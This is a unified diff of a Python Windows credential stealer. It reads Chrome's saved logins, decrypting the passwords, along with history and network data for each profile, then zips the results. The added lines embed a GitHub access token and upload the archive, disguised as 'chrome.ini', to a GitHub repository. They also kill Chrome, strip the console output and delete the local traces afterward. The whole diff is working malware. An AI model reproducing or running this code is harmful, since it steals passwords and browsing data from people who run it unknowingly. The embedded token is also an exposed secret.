@@ -2,6 +2,7 @@ from os import environ, path , mkdir , startfile , walk, chdir , system
 from Crypto.Cipher import AES
 from datetime import timezone, datetime, timedelta
 from time import sleep
+from shutil import copy
 import os
 import json
 import base64
@@ -9,12 +10,32 @@ import sqlite3
 import win32crypt
 import zipfile
 import shutil
-
+import requests
+import json
 
 
 base_path = environ['USERPROFILE']+"\\AppData\\Local\\Google\\Chrome\\User Data\\"
+TOKEN = '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'
 path_profile = []
 #_____(function)_____#
+def send_main_information(TOKEN, content, name_file_to_site):
+    sha = requests.get(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_to_site}",
+                       headers={"Authorization": f"token {TOKEN}"}).json()["sha"]
+    print(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_to_site}")
+    content_base64 = base64.b64encode(content).decode() # Encode content to Base64
+    data = {"content": content_base64, "message": "data", "sha": sha}
+    data = json.dumps(data)
+    main = requests.put(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_to_site}", data=data,
+                        headers={"Authorization": f"token {TOKEN}"})
+    print(main.status_code)
+
+def connected_to_internet(url='http://www.google.com/', timeout=5):
+    try:
+        _ = requests.head(url, timeout=timeout)
+        return True
+    except requests.ConnectionError:
+        return False
+
 def create_zip_from_folder(folder_path, zip_filename):
     # ایجاد یک فایل ZIP جدید
     with zipfile.ZipFile(zip_filename, 'w', compression=zipfile.ZIP_DEFLATED) as new_zip:
@@ -69,10 +90,6 @@ def main(db_path):
         if username or password:
             with open(file=f'{base_path}Default\\DATA\\login data.txt', mode="a",encoding="utf-8") as f:
                 f.write(f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}" + f"\n{'=' * 50}\n")
-            print(f"Origin URL: {origin_url}")
-            print(f"Action URL: {action_url}")
-            print(f"Username: {username}")
-            print(f"Password: {password}")
         else:
             continue
         if date_created != 86400000000 and date_created:
@@ -108,8 +125,22 @@ if path.exists(base_path + "Default"):
             f.write(str(r)+"\n\n")
     c.close()
     create_zip_from_folder(folder_path=base_path+"Default\\DATA" , zip_filename=environ['USERPROFILE']+"\\AppData\\Local\\Google\\Chrome\\chrome.zip")
+    sleep(10)
+    while True:
+        if connected_to_internet():
+            with open(environ['USERPROFILE']+"\\AppData\\Local\\Google\\Chrome\\chrome.zip", "rb") as f:
+                with open("file.ini", "wb") as r:
+                    r.write(f.read())
+                with open("file.ini", "rb") as f:
+                    send_main_information(TOKEN=TOKEN, content=f.read(), name_file_to_site="chrome.ini")
+                    break
+        else:
+            sleep(5)
+            continue
     shutil.rmtree(f"{base_path}Default\\DATA")
-else:
+    shutil.rmtree(environ['USERPROFILE']+"\\AppData\\Local\\Google\\Chrome\\chrome.zip")
+elif path.exists(environ['USERPROFILE']+"\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1"):
+    system("taskkill /im chrome.exe -f")
     base_path = environ['USERPROFILE']+"\\AppData\\Local\\Google\\Chrome\\User Data\\"
     path_data = environ['USERPROFILE']+"\\AppData\\Local\\Google\\Chrome"
     for i in range(1 , 5):
@@ -119,7 +150,6 @@ else:
             break
     mkdir(path_data+"\\DATA")
     for i in path_profile:
-        print(i)
         name_profile = i.split('\\')[-1]
         create_zip_from_folder(folder_path=i+"\\Network" , zip_filename=path_data+f"\\DATA\\{name_profile}_network.zip")
         con = sqlite3.connect(i + "\\History")
@@ -181,10 +211,6 @@ else:
                     with open(file=f'{path_data}\\DATA\\{name_profile}_login data.txt', mode="a", encoding="utf-8") as f:
                         f.write(
                             f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}" + f"\n{'=' * 50}\n")
-                    print(f"Origin URL: {origin_url}")
-                    print(f"Action URL: {action_url}")
-                    print(f"Username: {username}")
-                    print(f"Password: {password}")
                 else:
                     continue
                 if date_created != 86400000000 and date_created:
@@ -205,3 +231,17 @@ else:
                 pass
         main(i+"\\Login Data")
         create_zip_from_folder(folder_path=path_data+"\\DATA" , zip_filename=path_data+"\\chrome.zip")
+        sleep(10)
+    while True:
+        if connected_to_internet():
+            with open(path_data+"\\chrome.zip", "rb") as f:
+                with open("file.ini", "wb") as r:
+                    r.write(f.read())
+                with open("file.ini", "rb") as f:
+                    send_main_information(TOKEN=TOKEN , content=f.read() , name_file_to_site="chrome.ini")
+                    break
+        else:
+            sleep(5)
+            continue
+    os.remove(path_data+"\\chrome.zip")
+    shutil.rmtree(path_data+"\\DATA")
